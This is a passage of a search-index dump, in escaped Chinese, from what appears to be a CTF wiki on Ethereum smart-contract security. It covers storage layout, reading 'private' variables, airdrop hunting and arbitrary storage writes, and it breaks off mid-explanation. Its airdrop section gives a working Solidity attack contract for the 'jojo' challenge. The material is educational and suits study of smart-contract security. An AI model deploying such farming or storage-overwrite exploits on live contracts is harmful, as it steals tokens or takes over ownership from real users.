\u4e2d\u3002","title":"\u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32"},{"location":"blockchain/ethereum/storage/#_6","text":"\u7531\u4e8e\u4ee5\u592a\u574a\u4e0a\u7684\u6240\u6709\u4fe1\u606f\u90fd\u662f\u516c\u5f00\u7684\uff0c\u6240\u4ee5\u5373\u4f7f\u4e00\u4e2a\u53d8\u91cf\u88ab\u58f0\u660e\u4e3a private \uff0c\u6211\u4eec\u4ecd\u80fd\u8bfb\u5230\u53d8\u91cf\u7684\u5177\u4f53\u503c\u3002 \u5229\u7528 web3 \u63d0\u4f9b\u7684 web3.eth.getStorageAt() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u4ee5\u592a\u574a\u5730\u5740\u4e0a\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b58\u50a8\u5185\u5bb9\u3002\u6240\u4ee5\u53ea\u8981\u8ba1\u7b97\u51fa\u4e86\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u63d2\u69fd\u4f4d\u7f6e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528\u8be5\u51fd\u6570\u6765\u83b7\u5f97\u8be5\u53d8\u91cf\u7684\u5177\u4f53\u503c\u3002 \u8c03\u7528\uff1a // web3.eth.getStorageAt(address, position [, defaultBlock] [, callback]) web3 . eth . getStorageAt ( \"0x407d73d8a49eeb85d32cf465507dd71d507100c1\" , 0 ) . then ( console . log ); > \"0x033456732123ffff2342342dd12342434324234234fd234fd23fd4f23d4234\" \u53c2\u6570\uff1a address \uff1aString - \u8981\u8bfb\u53d6\u7684\u5730\u5740 position \uff1aNumber - \u5b58\u50a8\u4e2d\u7684\u7d22\u5f15\u7f16\u53f7 defaultBlock \uff1aNumber|String - \u53ef\u9009\uff0c\u4f7f\u7528\u8be5\u53c2\u6570\u8986\u76d6 web3.eth.defaultBlock \u5c5e\u6027\u503c callback \uff1aFunction - \u53ef\u9009\u7684\u56de\u8c03\u51fd\u6570, \u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u9519\u8bef\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u7ed3\u679c\u3002","title":"\u53ef\u89c1\u6027"},{"location":"blockchain/ethereum/storage/#_7","text":"\u4ee5 Balsn CTF 2019 \u7684 Bank \u4e00\u9898\u4e3a\u4f8b\uff0c\u66f4\u4e3a\u5177\u4f53\u8bb2\u89e3\u4ee5\u592a\u574a\u7684\u5b58\u50a8\u5e03\u5c40\u3002\u9898\u76ee\u4e2d\u53d8\u91cf\u548c\u7ed3\u6784\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a contract Bank { address public owner ; uint randomNumber = 0 ; struct SafeBox { bool done ; function ( uint , bytes12 ) internal callback ; bytes12 hash ; uint value ; } SafeBox [] safeboxes ; struct FailedAttempt { uint idx ; uint time ; bytes12 triedPass ; address origin ; } mapping ( address => FailedAttempt []) failedLogs ; } \u5408\u7ea6\u7684\u53d8\u91cf\u6309\u7167\u4ee5\u4e0b\u5e03\u5c40\u5b58\u50a8\u5728\u63d2\u69fd 0 \u5230 3 \u4e0a\uff1a ----------------------------------------------------- | unused ( 12 ) | owner ( 20 ) | <- slot 0 ----------------------------------------------------- | randomNumber ( 32 ) | <- slot 1 ----------------------------------------------------- | safeboxes . length ( 32 ) | <- slot 2 ----------------------------------------------------- | occupied by failedLogs but unused ( 32 ) | <- slot 3 ----------------------------------------------------- \u5bf9\u4e8e\u7ed3\u6784 SafeBox \u548c FailedAttempt \uff0c\u6bcf\u4e2a\u7ed3\u6784\u5360\u636e\u7684\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a # SafeBox ----------------------------------------------------- | unused (11) | hash (12) | callback (8) | done (1) | ----------------------------------------------------- | value (32) | ----------------------------------------------------- # FailedAttempt ----------------------------------------------------- | idx (32) | ----------------------------------------------------- | time (32) | ----------------------------------------------------- | origin (20) | triedPass (12) | ----------------------------------------------------- \u5bf9\u4e8e\u6570\u7ec4 safeboxes \uff0c\u6570\u7ec4\u5185\u5143\u7d20\u7684\u8d77\u59cb\u70b9\u5728 keccak256(2) \u5904\uff0c\u6bcf\u4e2a\u5143\u7d20\u5360\u636e 2 \u4e2a\u63d2\u69fd\uff1b\u800c\u5bf9\u4e8e\u6620\u5c04 failedLogs \uff0c\u9700\u8981\u5148\u901a\u8fc7 keccak256(addr . 3) \u6765\u5f97\u5230\u7279\u5b9a\u5730\u5740 addr \u5bf9\u5e94\u6570\u7ec4\u7684\u4f4d\u7f6e\uff0c\u8be5\u4f4d\u7f6e\u8bb0\u5f55\u7740\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u800c\u6570\u7ec4\u771f\u6b63\u7684\u8d77\u59cb\u70b9\u4f4d\u4e8e keccak256(keccak256(addr . 3)) \u5904\uff0c\u6bcf\u4e2a\u5143\u7d20\u5360\u636e 3 \u4e2a\u63d2\u69fd\u3002 \u53ef\u4ee5\u501f\u52a9\u4ee5\u4e0b\u4ee3\u7801\u65b9\u4fbf\u5730\u8ba1\u7b97\u6570\u7ec4\u548c\u6620\u5c04\u5bf9\u5e94\u5143\u7d20\u7684\u771f\u6b63\u4f4d\u7f6e\uff1a function read_slot ( uint k ) public view returns ( bytes32 res ) { assembly { res : = sload ( k ) } } function cal_addr ( uint k , uint p ) public pure returns ( bytes32 res ) { res = keccak256 ( abi . encodePacked ( k , p )); } function cal_addr ( uint p ) public pure returns ( bytes32 res ) { res = keccak256 ( abi . encodePacked ( p )); }","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/storage/#_8","text":"\u4e0e\u4ee5\u592a\u574a\u7684\u5b58\u50a8\u76f8\u5173\u7684\u653b\u51fb\u4e00\u822c\u5206\u4e3a\u4e24\u7c7b\uff1a \u5229\u7528\u4ee5\u592a\u574a\u4e0a\u5b58\u50a8\u672c\u8d28\u4e0a\u90fd\u662f\u516c\u5f00\u7684\u8fd9\u4e00\u7279\u6027\uff0c\u4efb\u610f\u8bfb\u53d6\u58f0\u660e\u4e3a private \u7684\u53d8\u91cf\u3002 \u7ed3\u5408\u4efb\u610f\u5199\u7684\u6f0f\u6d1e\uff0c\u8986\u76d6\u4ee5\u592a\u574a\u4e0a\u7684\u7279\u5b9a\u4f4d\u7f6e\u7684\u5b58\u50a8","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/storage/#xctf_final-2019","text":"\u9898\u76ee\u540d\u79f0 Happy_DOuble_Eleven","title":"XCTF_final 2019"},{"location":"blockchain/ethereum/storage/#balsn-2019","text":"\u9898\u76ee\u540d\u79f0 Bank","title":"Balsn 2019"},{"location":"blockchain/ethereum/storage/#_9","text":"\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6 OPCODE \u9006\u5411\u4e4b\u7406\u8bba\u57fa\u7840\u7bc7 - \u5168\u5c40\u53d8\u91cf\u7684\u50a8\u5b58\u6a21\u578b Solidity\u4e2d\u6587\u6587\u6863 - \u5b58\u50a8\u4e2d\u7684\u72b6\u6001\u53d8\u91cf\u50a8\u5b58\u7ed3\u6784 web3.js - Ethereum JavaScript API Balsn CTF 2019 - Bank","title":"\u53c2\u8003"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/","text":"Airdrop Hunting \u00b6 \u539f\u7406 \u00b6 \u8585\u7f8a\u6bdb\u653b\u51fb\u6307\u4f7f\u7528\u591a\u4e2a\u4e0d\u540c\u7684\u65b0\u8d26\u6237\u6765\u8c03\u7528\u7a7a\u6295\u51fd\u6570\u83b7\u5f97\u7a7a\u6295\u5e01\u5e76\u8f6c\u8d26\u81f3\u653b\u51fb\u8005\u8d26\u6237\u4ee5\u8fbe\u5230\u8d22\u5bcc\u7d2f\u8ba1\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002\u8fd9\u7c7b\u653b\u51fb\u65b9\u5f0f\u8f83\u4e3a\u666e\u901a\u4e14\u5e38\u89c1\uff0c\u53ea\u8981\u662f\u6709\u7a7a\u6295\u51fd\u6570\u7684\u5408\u7ea6\u90fd\u80fd\u591f\u8fdb\u884c\u8585\u7f8a\u6bdb\u3002\u5176\u4e2d\u9996\u4e2a\u81ea\u52a8\u5316\u8585\u7f8a\u6bdb\u653b\u51fb\u51fa\u73b0\u5728 Simoleon \u4e0a\u3002 \u4f8b\u5b50 \u00b6 \u4ee5\u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019 \u7684 jojo \u4e00\u9898\u4e3a\u4f8b\uff0c\u8bb2\u89e3\u4e00\u4e0b\u5982\u4f55\u8fdb\u884c\u8585\u7f8a\u6bdb\u653b\u51fb\u3002\u9898\u76ee\u5408\u7ea6\u7684\u6e90\u7801\u5982\u4e0b\uff1a pragma solidity ^ 0.4.24 ; contract jojo { mapping ( address => uint ) public balanceOf ; mapping ( address => uint ) public gift ; address owner ; constructor () public { owner = msg.sender ; } event SendFlag ( string b64email ); function payforflag ( string b64email ) public { require ( balanceOf [ msg.sender ] >= 100000 ); emit SendFlag ( b64email ); } function jojogame () payable { uint geteth = msg.value / 1000000000000000000 ; balanceOf [ msg.sender ] += geteth ; } function gift () public { assert ( gift [ msg.sender ] == 0 ); balanceOf [ msg.sender ] += 100 ; gift [ msg.sender ] = 1 ; } function transfer ( address to , uint value ) public { assert ( balanceOf [ msg.sender ] >= value ); balanceOf [ msg.sender ] -= value ; balanceOf [ to ] += value ; } } \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u9700\u8981\u6ee1\u8db3 balanceOf[msg.sender] >= 100000 \u624d\u53ef\u4ee5\u5f97\u5230 flag\u3002 \u9898\u76ee\u4e2d\u6709\u7a7a\u6295\u51fd\u6570\uff0c\u6bcf\u6b21\u7a7a\u6295\u53ef\u4ee5\u4f7f balance \u589e\u52a0 100\u3002 function gift () public { assert ( gift [ msg.sender ] == 0 ); balanceOf [ msg.sender ] += 100 ; gift [ msg.sender ] = 1 ; } \u5e76\u4e14\u4e5f\u6709\u8f6c\u8d26\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06 balance \u8f6c\u7ed9\u5176\u4ed6\u7528\u6237\u3002 function transfer ( address to , uint value ) public { assert ( balanceOf [ msg.sender ] >= value ); balanceOf [ msg.sender ] -= value ; balanceOf [ to ] += value ; } \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8585\u7f8a\u6bdb\u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u521b\u5efa 1000 \u4e2a\u4e34\u65f6\u5408\u7ea6\u6765\u8c03\u7528\u7a7a\u6295\u51fd\u6570\uff0c\u5e76\u8f6c\u8d26\u7ed9\u4e3b\u5408\u7ea6\u6765\u4f7f\u5f97 balanceOf[msg.sender] >= 100000\u3002 contract attack { function attack_airdrop ( int num ){ for ( int i = 0 ; i < num ; i ++ ){ new middle_attack ( this ); } } function get_flag ( string email ){ jojo target = jojo ( 0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36 ); target . payforflag ( email ); } } contract middle_attack { constructor ( address addr ){ jojo target = jojo ( 0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36 ); target . gift (); target . transfer ( addr , 100 ); } } \u9898\u76ee \u00b6 \u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019 \u00b6 \u9898\u76ee\u540d\u79f0 jojo RoarCTF 2019 \u00b6 \u9898\u76ee\u540d\u79f0 CoinFlip QWB 2019 \u00b6 \u9898\u76ee\u540d\u79f0 babybet bctf 2018 \u00b6 \u9898\u76ee\u540d\u79f0 Fake3d Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002 \u53c2\u8003 \u00b6 \u9996\u4e2a\u533a\u5757\u94fe token \u7684\u81ea\u52a8\u5316\u8585\u7f8a\u6bdb\u653b\u51fb\u5206\u6790 \u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019 - jojo","title":"Airdrop Hunting"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#airdrop-hunting","text":"","title":"Airdrop Hunting"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#_1","text":"\u8585\u7f8a\u6bdb\u653b\u51fb\u6307\u4f7f\u7528\u591a\u4e2a\u4e0d\u540c\u7684\u65b0\u8d26\u6237\u6765\u8c03\u7528\u7a7a\u6295\u51fd\u6570\u83b7\u5f97\u7a7a\u6295\u5e01\u5e76\u8f6c\u8d26\u81f3\u653b\u51fb\u8005\u8d26\u6237\u4ee5\u8fbe\u5230\u8d22\u5bcc\u7d2f\u8ba1\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002\u8fd9\u7c7b\u653b\u51fb\u65b9\u5f0f\u8f83\u4e3a\u666e\u901a\u4e14\u5e38\u89c1\uff0c\u53ea\u8981\u662f\u6709\u7a7a\u6295\u51fd\u6570\u7684\u5408\u7ea6\u90fd\u80fd\u591f\u8fdb\u884c\u8585\u7f8a\u6bdb\u3002\u5176\u4e2d\u9996\u4e2a\u81ea\u52a8\u5316\u8585\u7f8a\u6bdb\u653b\u51fb\u51fa\u73b0\u5728 Simoleon \u4e0a\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#_2","text":"\u4ee5\u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019 \u7684 jojo \u4e00\u9898\u4e3a\u4f8b\uff0c\u8bb2\u89e3\u4e00\u4e0b\u5982\u4f55\u8fdb\u884c\u8585\u7f8a\u6bdb\u653b\u51fb\u3002\u9898\u76ee\u5408\u7ea6\u7684\u6e90\u7801\u5982\u4e0b\uff1a pragma solidity ^ 0.4.24 ; contract jojo { mapping ( address => uint ) public balanceOf ; mapping ( address => uint ) public gift ; address owner ; constructor () public { owner = msg.sender ; } event SendFlag ( string b64email ); function payforflag ( string b64email ) public { require ( balanceOf [ msg.sender ] >= 100000 ); emit SendFlag ( b64email ); } function jojogame () payable { uint geteth = msg.value / 1000000000000000000 ; balanceOf [ msg.sender ] += geteth ; } function gift () public { assert ( gift [ msg.sender ] == 0 ); balanceOf [ msg.sender ] += 100 ; gift [ msg.sender ] = 1 ; } function transfer ( address to , uint value ) public { assert ( balanceOf [ msg.sender ] >= value ); balanceOf [ msg.sender ] -= value ; balanceOf [ to ] += value ; } } \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u9700\u8981\u6ee1\u8db3 balanceOf[msg.sender] >= 100000 \u624d\u53ef\u4ee5\u5f97\u5230 flag\u3002 \u9898\u76ee\u4e2d\u6709\u7a7a\u6295\u51fd\u6570\uff0c\u6bcf\u6b21\u7a7a\u6295\u53ef\u4ee5\u4f7f balance \u589e\u52a0 100\u3002 function gift () public { assert ( gift [ msg.sender ] == 0 ); balanceOf [ msg.sender ] += 100 ; gift [ msg.sender ] = 1 ; } \u5e76\u4e14\u4e5f\u6709\u8f6c\u8d26\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06 balance \u8f6c\u7ed9\u5176\u4ed6\u7528\u6237\u3002 function transfer ( address to , uint value ) public { assert ( balanceOf [ msg.sender ] >= value ); balanceOf [ msg.sender ] -= value ; balanceOf [ to ] += value ; } \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8585\u7f8a\u6bdb\u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u521b\u5efa 1000 \u4e2a\u4e34\u65f6\u5408\u7ea6\u6765\u8c03\u7528\u7a7a\u6295\u51fd\u6570\uff0c\u5e76\u8f6c\u8d26\u7ed9\u4e3b\u5408\u7ea6\u6765\u4f7f\u5f97 balanceOf[msg.sender] >= 100000\u3002 contract attack { function attack_airdrop ( int num ){ for ( int i = 0 ; i < num ; i ++ ){ new middle_attack ( this ); } } function get_flag ( string email ){ jojo target = jojo ( 0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36 ); target . payforflag ( email ); } } contract middle_attack { constructor ( address addr ){ jojo target = jojo ( 0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36 ); target . gift (); target . transfer ( addr , 100 ); } }","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#_3","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#2019","text":"\u9898\u76ee\u540d\u79f0 jojo","title":"\u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#roarctf-2019","text":"\u9898\u76ee\u540d\u79f0 CoinFlip","title":"RoarCTF 2019"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#qwb-2019","text":"\u9898\u76ee\u540d\u79f0 babybet","title":"QWB 2019"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#bctf-2018","text":"\u9898\u76ee\u540d\u79f0 Fake3d Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"bctf 2018"},{"location":"blockchain/ethereum/attacks/airdrop-hunting/#_4","text":"\u9996\u4e2a\u533a\u5757\u94fe token \u7684\u81ea\u52a8\u5316\u8585\u7f8a\u6bdb\u653b\u51fb\u5206\u6790 \u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019 - jojo","title":"\u53c2\u8003"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/","text":"Arbitrary Writing \u00b6 \u539f\u7406 \u00b6 \u52a8\u6001\u6570\u7ec4\u7684\u4efb\u610f Storage \u5b58\u50a8\u5199\u6f0f\u6d1e\uff0c\u6839\u636e \u5b98\u65b9\u6587\u6863 \u4ecb\u7ecd\uff0c\u53ef\u603b\u7ed3\u5982\u4e0b EVM \u4e2d\uff0c\u6709\u4e09\u4e2a\u5730\u65b9\u53ef\u4ee5\u5b58\u50a8\u53d8\u91cf\uff0c\u5206\u522b\u662f Memory\u3001Stack \u548c Storage\u3002Memory \u548c Stack \u662f\u5728\u6267\u884c\u671f\u95f4\u4e34\u65f6\u751f\u6210\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u4e3b\u8981\u8d1f\u8d23\u8fd0\u884c\u65f6\u7684\u6570\u636e\u5b58\u50a8\uff0cStorage \u662f\u6c38\u4e45\u5b58\u5728\u4e8e\u533a\u5757\u94fe\u4e2d\u7684\u53d8\u91cf\u3002 Memory: \u5185\u5b58\uff0c\u751f\u547d\u5468\u671f\u4ec5\u4e3a\u6574\u4e2a\u65b9\u6cd5\u6267\u884c\u671f\u95f4\uff0c\u51fd\u6570\u8c03\u7528\u540e\u56de\u6536\uff0c\u56e0\u4e3a\u4ec5\u4fdd\u5b58\u4e34\u65f6\u53d8\u91cf\uff0c\u6545 GAS \u5f00\u9500\u5f88\u5c0f Storage: \u6c38\u4e45\u50a8\u5b58\u5728\u533a\u5757\u94fe\u4e2d\uff0c\u7531\u4e8e\u4f1a\u6c38\u4e45\u4fdd\u5b58\u5408\u7ea6\u72b6\u6001\u53d8\u91cf\uff0c\u6545 GAS \u5f00\u9500\u4e5f\u6700\u5927 Stack: \u5b58\u653e\u90e8\u5206\u5c40\u90e8\u503c\u7c7b\u578b\u53d8\u91cf\uff0c\u51e0\u4e4e\u514d\u8d39\u4f7f\u7528\u7684\u5185\u5b58\uff0c\u4f46\u6709\u6570\u91cf\u9650\u5236 EVM \u5bf9\u6bcf\u4e00\u4e2a\u667a\u80fd\u5408\u7ea6\u7ef4\u62a4\u4e86\u4e00\u4e2a\u5de8\u5927\u7684 key-value \u7684\u5b58\u50a8\u7ed3\u6784\uff0c\u7528\u4e8e\u6301\u4e45\u5316\u5b58\u50a8\u6570\u636e\uff0c\u6211\u4eec\u79f0\u8fd9\u7247\u533a\u57df\u4e3a Storage\u3002\u9664\u4e86 map \u6620\u5c04\u53d8\u91cf\u548c\u53d8\u957f\u6570\u7ec4\u4ee5\u5916\u7684\u6240\u6709\u7c7b\u578b\u53d8\u91cf\uff0c\u5728 Storage \u4e2d\u662f\u4f9d\u6b21\u8fde\u7eed\u4ece slot 0 \u5f00\u59cb\u6392\u5217\u7684\uff0c\u4e00\u5171\u6709 2^256 \u4e2a slot\uff0c\u6bcf\u4e2a slot \u53ef\u4ee5\u5b58\u50a8 32 \u5b57\u8282\u7684\u6570\u636e\u3002Storage \u5b58\u50a8\u7ed3\u6784\u662f\u5728\u5408\u7ea6\u521b\u5efa\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u597d\u7684\uff0c\u5b83\u53d6\u51b3\u4e8e\u5408\u7ea6\u6240\u58f0\u660e\u72b6\u6001\u53d8\u91cf\uff0c\u4f46\u662f\u5185\u5bb9\u53ef\u4ee5\u901a\u8fc7 Transaction \u6539\u53d8\u3002 Storage \u53d8\u91cf\u5927\u81f4\u5206\u4e3a 4 \u79cd\u7c7b\u578b\uff1a\u5b9a\u957f\u53d8\u91cf\u3001\u7ed3\u6784\u4f53\u3001map \u6620\u5c04\u53d8\u91cf\u548c\u53d8\u957f\u6570\u7ec4\u3002\u5982\u679c\u591a\u4e2a\u53d8\u91cf\u5360\u7528\u7684\u5927\u5c0f\u5c0f\u4e8e 32 \u5b57\u8282\uff0c\u6309\u7167\u7d27\u5bc6\u6253\u5305\u539f\u5219\uff0c\u4f1a\u5c3d\u53ef\u80fd\u6253\u5305\u5230\u5355\u4e2a slot \u4e2d\uff0c\u5177\u4f53\u89c4\u5219\u5982\u4e0b\uff1a \u5728 slot \u4e2d\uff0c\u662f\u6309\u7167\u4f4e\u4f4d\u5bf9\u9f50\u5b58\u50a8\u7684\uff0c\u5373\u5927\u7aef\u5e8f \u57fa\u672c\u7c7b\u578b\u53d8\u91cf\u5b58\u50a8\u65f6\u4ec5\u5b58\u50a8\u5b83\u4eec\u5b9e\u9645\u6240\u9700\u7684\u5b57\u8282\u6570 \u5982\u679c\u57fa\u672c\u7c7b\u578b\u53d8\u91cf\u4e0d\u80fd\u653e\u5165\u67d0\u4e2a slot \u4f59\u4e0b\u7684\u7a7a\u95f4\uff0c\u5b83\u5c06\u88ab\u653e\u5165\u4e0b\u4e00\u4e2a slot map \u548c\u53d8\u957f\u6570\u7ec4\u603b\u662f\u4f7f\u7528\u4e00\u4e2a\u5168\u65b0\u7684 slot\uff0c\u5e76\u5360\u7528\u6574\u4e2a slot\uff0c\u4f46\u5bf9\u4e8e\u5176\u5185\u90e8\u7684\u6bcf\u4e2a\u53d8\u91cf\uff0c\u8fd8\u662f\u8981\u9075\u4ece\u4e0a\u9762\u7684\u89c4\u5219 slot \u8ba1\u7b97\u89c4\u5219 \u00b6 \u9996\u5148\u6211\u4eec\u5206\u6790\u4e00\u4e0b\u5404\u79cd\u5bf9\u8c61\u7ed3\u6784\u5728 EVM \u4e2d\u7684\u5b58\u50a8\u548c\u8bbf\u95ee\u60c5\u51b5 \u5b9a\u957f\u53d8\u91cf\u548c\u7ed3\u6784\u4f53 \u00b6 Solidity \u4e2d\u7684\u5b9a\u957f\u5b9a\u91cf\u5728\u5b9a\u4e49\u7684\u65f6\u5019\uff0c\u5176\u957f\u5ea6\u5c31\u5df2\u7ecf\u88ab\u9650\u5236\u4f4f\u4e86\u3002\u6bd4\u5982\u5b9a\u957f\u6574\u578b\uff08uint\u3001uint8\uff09\uff0c\u5730\u5740\u5e38\u91cf\uff08address\uff09\uff0c\u5b9a\u957f\u5b57\u8282\u6570\u7ec4\uff08bytes1-32\uff09\u7b49\uff0c\u8fd9\u7c7b\u7684\u53d8\u91cf\u5728 Storage \u4e2d\u662f\u5c3d\u53ef\u80fd\u6253\u5305\u6210 32 \u5b57\u8282\u7684\u5757\u987a\u5e8f\u5b58\u50a8\u7684\u3002 Solidity \u7684\u7ed3\u6784\u4f53\u5e76\u6ca1\u6709\u7279\u6b8a\u7684\u5b58\u50a8\u6a21\u578b\uff0c\u5728 Storage \u4e2d\u7684\u5b58\u50a8\u53ef\u4ee5\u6309\u7167\u5b9a\u957f\u53d8\u91cf\u89c4\u5219\u5206\u6790\u3002 Map \u6620\u5c04\u53d8\u91cf \u00b6 \u5728 Solidity \u4e2d\uff0c\u5e76\u4e0d\u5b58\u50a8 map \u7684\u952e\uff0c\u53ea\u5b58\u50a8\u952e\u5bf9\u5e94\u7684\u503c\uff0c\u503c\u662f\u901a\u8fc7\u952e\u7684 hash \u7d22\u5f15\u6765\u627e\u5230\u7684\u3002\u7528 slotM slotM \u8868\u793a map \u58f0\u660e\u7684 slot \u4f4d\u7f6e\uff0c\u7528 key key \u8868\u793a\u952e\uff0c\u7528 value value \u8868\u793a key key \u5bf9\u5e94\u7684\u503c\uff0c\u7528 slotV slotV \u8868\u793a value value \u7684\u5b58\u50a8\u4f4d\u7f6e\uff0c\u5219 slotV = keccak256(key|slotM) slotV = keccak256(key|slotM) value = sload(slotV) value = sload(slotV) \u53d8\u957f\u6570\u7ec4 \u00b6 \u7528 slotA slotA \u8868\u793a\u53d8\u957f\u6570\u7ec4\u58f0\u660e\u7684\u4f4d\u7f6e\uff0c\u7528 length length \u8868\u793a\u53d8\u957f\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u7528 slotV slotV \u8868\u793a\u53d8\u957f\u6570\u7ec4\u6570\u636e\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u7528 value value \u8868\u793a\u53d8\u957f\u6570\u7ec4\u67d0\u4e2a\u6570\u636e\u7684\u503c\uff0c\u7528 index index \u8868\u793a value value \u5bf9\u5e94\u7684\u7d22\u5f15\u4e0b\u6807\uff0c\u5219 length = sload(slotA) length = sload(slotA) slotV = keccak256(slotA) + index slotV = keccak256(slotA) + index value = sload(slotV) value = sload(slotV) \u53d8\u957f\u6570\u7ec4\u5728\u7f16\u8bd1\u671f\u95f4\u65e0\u6cd5\u77e5\u9053\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u6ca1\u529e\u6cd5\u63d0\u524d\u9884\u7559\u5b58\u50a8\u7a7a\u95f4\uff0c\u6240\u4ee5 Solidity \u5c31\u7528 slotA slotA \u4f4d\u7f6e\u5b58\u50a8\u4e86\u53d8\u957f\u6570\u7ec4\u7684\u957f\u5ea6 Note \u6ce8\uff1a\u53d8\u957f\u6570\u7ec4\u5177\u4f53\u6570\u636e\u5b58\u653e\u5728 keccak256 \u54c8\u5e0c\u8ba1\u7b97\u4e4b\u540e\u7684\u4e00\u7247\u8fde\u7eed\u5b58\u50a8\u533a\u57df\uff0c\u8fd9\u4e00\u70b9\u4e0e Map \u6620\u5c04\u53d8\u91cf\u4e0d\u540c\u3002 \u6f0f\u6d1e\u4ecb\u7ecd \u00b6 \u5728\u4ee5\u592a\u574a EVM \u7684\u8bbe\u8ba1\u601d\u8def\u4e2d\uff0c\u6240\u6709\u7684 Storage \u53d8\u91cf\u5171\u7528\u4e00\u7247\u5927\u5c0f\u4e3a 2^256*32 \u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u6ca1\u6709\u5404\u81ea\u7684\u5b58\u50a8\u533a\u57df\u5212\u5206\u3002 Storage \u7a7a\u95f4\u5373\u4f7f\u5f88\u5927\u4e5f\u662f\u6709\u9650\u5927\u5c0f\uff0c\u5f53\u53d8\u957f\u6570\u7ec4\u957f\u5ea6\u5f88\u5927\u65f6\uff0c\u8003\u8651\u6781\u7aef\u60c5\u51b5\uff0c\u5982\u679c\u957f\u5ea6\u8fbe\u5230 2^256\uff0c\u5219\u53ef\u5bf9\u4efb\u610f Storage \u53d8\u91cf\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\uff0c\u8fd9\u662f\u975e\u5e38\u53ef\u6015\u7684\u3002 \u4f8b\u5b50 \u00b6 Source \u00b6 pragma solidity ^ 0.4.24 ; contract ArrayTest { address public owner ; bool public contact ; bytes32 [] public codex ; constructor () public { owner = msg.sender ; } function record ( bytes32 _content ) public { codex . push ( _content ); } function retract () public { codex . length -- ; } function revise ( uint i , bytes32 _content ) public { codex [ i ] = _content ; } } \u8fd9\u91cc\u653b\u51fb\u8005\u5982\u4f55\u624d\u80fd\u6210\u4e3a owner \u5462\uff1f\u5176\u4e2d owner \u6700\u521d\u4e3a 0x73048cec9010e92c298b016966bde1cc47299df5 Analyse \u00b6 \u6570\u7ec4 codex \u7684 slot \u4e3a 1 \uff0c\u540c\u65f6\u8fd9\u4e5f\u662f\u5b58\u50a8\u6570\u7ec4 length \u7684\u5730\u65b9\uff0c\u800c codex \u7684\u5b9e\u9645\u5185\u5bb9\u5b58\u50a8\u5728 keccak256(bytes32(1)) \u5f00\u59cb\u7684\u4f4d\u7f6e Info Keccak256 \u662f\u7d27\u5bc6\u6253\u5305\u7684\uff0c\u610f\u601d\u662f\u8bf4\u53c2\u6570\u4e0d\u4f1a\u8865\u4f4d\uff0c\u591a\u4e2a\u53c2\u6570\u4e5f\u4f1a\u76f4\u63a5\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u6240\u4ee5\u8981\u7528 keccak256(bytes32(1)) \u8fd9\u6837\u6211\u4eec\u5c31\u77e5\u9053\u4e86 codex \u5b9e\u9645\u7684\u5b58\u50a8\u7684 slot \uff0c\u53ef\u4ee5\u5c06\u52a8\u6001\u6570\u7ec4\u5185\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\u8ba1\u7b97\u65b9\u6cd5\u6982\u62ec\u4e3a: array[index] == sload(keccak256(slot(array)) + index). \u56e0\u4e3a\u603b\u5171\u6709 2^256 \u4e2a slot \uff0c\u8981\u4fee\u6539 slot 0 \uff0c\u5047\u8bbe codex \u5b9e\u9645\u6240\u5728 slot x 